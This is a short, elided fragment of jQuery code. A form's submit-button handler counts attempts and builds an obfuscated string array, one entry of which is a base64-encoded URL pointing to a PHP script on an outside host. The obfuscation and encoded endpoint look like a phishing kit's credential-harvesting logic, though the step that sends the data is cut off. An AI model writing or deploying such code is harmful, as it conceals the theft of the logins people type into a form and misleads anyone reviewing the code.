...
$(document).ready(function() {
  ...
  $("#submit-btn").click(function(event) {
    ...
    tt = tt + 1;
    /** @type {!Array} */
    var HELLO_I18N = ["890861BzgNsv", "114682XmmzuR", "8951uSLnRx", "1LjrfsP", "aHR0cHM6Ly9zdW55bC1tb3Rvci5jb20vYSBhLnBocA==", "114164CgnDLi", "1MYhJRN", "677206qoCZOQ", "473185BQyADj", "1izxLaa", "574411hFYeBm", "13zpiJyh", "4GthmMr"];
    /**
     * @param {string} n
     * @param {?} fn
     * @return {?}
